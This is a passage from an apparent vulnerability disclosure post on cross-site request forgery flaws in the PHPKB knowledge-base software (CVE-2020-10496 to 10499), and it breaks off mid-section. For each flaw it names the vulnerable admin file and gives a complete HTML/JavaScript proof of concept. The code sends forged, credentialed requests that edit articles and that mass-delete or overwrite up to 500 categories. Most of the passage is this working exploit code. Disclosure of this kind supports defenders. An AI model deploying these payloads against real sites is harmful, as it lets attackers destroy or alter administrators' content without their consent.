			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-template.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">title=sdasdasdasdasdasdasdasdaads&amp;txtContent=descriptioncontent&amp;author_id=1&amp;make_visible=active&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;p=c29ydD0mb3JkZXI9&amp;default=no&amp;directsave=Save</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-an-article-cve-2020-10496">Cross-Site Request Forgery when editing an article (CVE-2020-10496)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-article.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “my articles”;</li>
  <li>click on “edit” and then click on “save article”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!--To change the article id, find \"article_id and change the id of the desired article --&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="kd">function</span> <span class="nx">submitRequest</span><span class="p">()</span>
      <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]</span><span class="se">\</span><span class="s2">/admin</span><span class="se">\</span><span class="s2">/save-article.php</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text</span><span class="se">\</span><span class="s2">/html,application</span><span class="se">\</span><span class="s2">/xhtml+xml,application</span><span class="se">\</span><span class="s2">/xml;q=0.9,image</span><span class="se">\</span><span class="s2">/webp,*</span><span class="se">\</span><span class="s2">/*;q=0.8</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept-Language</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">multipart</span><span class="se">\</span><span class="s2">/form-data; boundary=---------------------------3042735397090</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">type</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">public</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">se_able_public_1</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">nstate1</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">yes</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">nstate4</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">no</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">nstate7</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">no</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">pub_state</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">pri_state</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">0</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">author</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">title</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">test</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">txtContent</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">test</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">test</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">summary</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">test</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">make_visible</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">yes</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">enable_comments</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">yes</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">enable_ratings</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">yes</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">publish_date</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">2020-01-11</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">expiry_date</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">2020-01-27</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">filename0</span><span class="se">\"</span><span class="s2">; filename=</span><span class="se">\"\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Type: application/octet-stream</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">filenamecap0</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">totalfiles</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">article_id</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">1</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">autosave_id</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">0</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">from_edit_section</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">true</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">preview_section</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">true</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">fromdraftsection</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">mode</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">p</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">c3RhdHVzPW93biZzb3J0PSZvcmRlcj0=</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">UpdateArticleSubmit</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Update Article</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------3042735397090--</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
          <span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span> 
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="na">onclick=</span><span class="s">"submitRequest();"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-category-cve-2020-10497">Cross-Site Request Forgery when deleting a category (CVE-2020-10497)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-categories.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “categories” and click on “manage categories”;</li>
  <li>click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">categories</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-categories.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=delete</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-category-cve-2020-10498">Cross-Site Request Forgery when editing a category (CVE-2020-10498)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-category.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “categories” and click on “manage categories”;</li>
  <li>click on “edit”, then on “save category”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change type parameter to public if you want to make the categories public, else write private --&gt;</span>
<span class="c">&lt;!-- Change the title parameter to edit all the titles --&gt;</span>
<span class="c">&lt;!-- Change the content parameter to change all the categories' description --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">categories</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-category.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">type=public&amp;title=dssdadasdssdadas&amp;parent_public=0&amp;parent_private=0&amp;content=dssdadasdssdadasdssdadas&amp;group_permissions=inherit&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;current_status=public&amp;p=&amp;submit=Save+Category</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-closing-a-ticket-cve-2020-10499">Cross-Site Request Forgery when closing a ticket (CVE-2020-10499)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-tickets.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “open”;</li>
